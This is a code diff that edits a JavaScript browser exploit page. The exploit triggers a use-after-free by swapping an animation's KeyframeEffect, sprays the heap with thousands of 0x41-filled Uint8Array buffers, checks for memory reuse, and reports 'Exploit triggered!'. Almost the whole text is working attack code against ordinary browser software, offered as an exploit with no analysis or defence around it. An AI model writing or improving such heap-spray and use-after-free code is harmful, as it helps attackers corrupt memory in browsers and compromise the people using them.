@@ -61,8 +61,15 @@
               const animation = cite.getAnimations()[0];
               object.width = "1em";
               object.codeBase;
-              // Perform heap spray before changing effect
-              const spray = heapSpray();
+              // Initialize spray array before changing effect
+              let spray = [];
+              for (let i = 0; i < 10000; i++) {
+                let arr = new Uint8Array(0x1000);
+                for (let j = 0; j < arr.length; j++) {
+                  arr[j] = 0x41;
+                }
+                spray.push(arr);
+              }
               animation.effect = new KeyframeEffect(dl, {});
               // Check for UAF immediately after changing effect
               debug_log("Checking for UAF memory reuse...");
@@ -74,6 +81,8 @@
                   return;
                 }
               }
+              // Perform heap spray after UAF check
+              heapSpray();
               debug_log("UAF triggered, check for crash or memory corruption.");
               status.textContent = "Exploit triggered!";
             } catch (e) {
